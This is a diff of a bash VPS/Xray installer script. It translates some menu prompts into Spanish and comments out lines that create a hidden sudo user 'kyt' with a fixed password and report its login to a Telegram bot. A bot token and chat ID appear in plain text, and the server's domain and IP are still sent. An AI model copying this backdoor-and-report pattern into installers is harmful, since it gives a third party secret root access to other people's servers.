@@ -300,15 +300,15 @@ function pasang_domain() {
 echo -e ""
 clear
     echo -e "   .----------------------------------."
-echo -e "   |\e[1;32mPlease Select a Domain Type Below \e[0m|"
+echo -e "   |\e[1;32mSeleccione un tipo de dominio a continuación \e[0m|"
 echo -e "   '----------------------------------'"
-echo -e "     \e[1;32m1)\e[0m Enter Your Subdomain"
-echo -e "     \e[1;32m2)\e[0m Use a Random Subdomain"
+echo -e "     \e[1;32m1)\e[0m Ingrese su subdominio"
+echo -e "     \e[1;32m2)\e[0m Utilice un subdominio aleatorio"
 echo -e "   ------------------------------------"
 read -p "   Please select numbers 1-2 or Any Button(Random) : " host
 echo ""
 if [[ $host == "1" ]]; then
-echo -e "   \e[1;32mPlease Enter Your Subdomain $NC"
+echo -e "   \e[1;32mPor favor ingrese su subdominio $NC"
 read -p "   Subdomain: " host1
 echo "IP=" >> /var/lib/kyt/ipvps.conf
 echo $host1 > /etc/xray/domain
@@ -333,12 +333,12 @@ function password_default() {
     domain=$(cat /root/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
     userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
+    #Username="kyt"
+    #Password=kyt
+    #mkdir -p /home/script/
+    #useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+    #echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
+    #usermod -aG sudo $Username > /dev/null 2>&1
 
     CHATID="6383512264"
     KEY="6633153384:AAFZu8cehxKiII6BLrTU2jr4KUZAZie6v7M"
@@ -355,10 +355,10 @@ function password_default() {
     <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
     <code>Ram Used   :</code> <code>$Ram_Total MB</code>
     ============================
-    <code>Domain     :</code> <code>$domain</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>User Login :</code> <code>$Username</code>
-    <code>Pass Login :</code> <code>$Password</code>
+    <code>Domain :</code> <code>$domain</code>
+    <code>IP Vps :</code> <code>$MYIP</code>
+    #<code>User Login :</code> <code>$Username</code>
+    #<code>Pass Login :</code> <code>$Password</code>
     <code>User Script:</code> <code>$username</code>
     <code>Exp Script :</code> <code>$exp</code>
     ============================
